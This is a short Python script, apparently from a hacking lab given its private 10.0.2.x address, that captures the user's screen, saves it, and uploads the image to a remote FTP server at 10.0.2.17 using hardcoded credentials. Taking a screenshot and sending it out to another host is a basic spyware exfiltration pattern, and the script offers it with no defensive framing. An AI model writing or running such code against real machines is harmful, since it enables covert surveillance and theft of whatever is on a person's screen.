import pyscreenshot
import ftplib
import os
#Captures the screen
image = pyscreenshot.grab()

#Displays the screenshot
image.show()

#Saves the screenshot
image.save("screenshot.png")

session = ftplib.FTP("10.0.2.17", "rorro", "rorro")
file = open("screenshot.png", "rb")
session.storbinary("STOR /tmp/screensho.png", file)
file.close()
session.quit()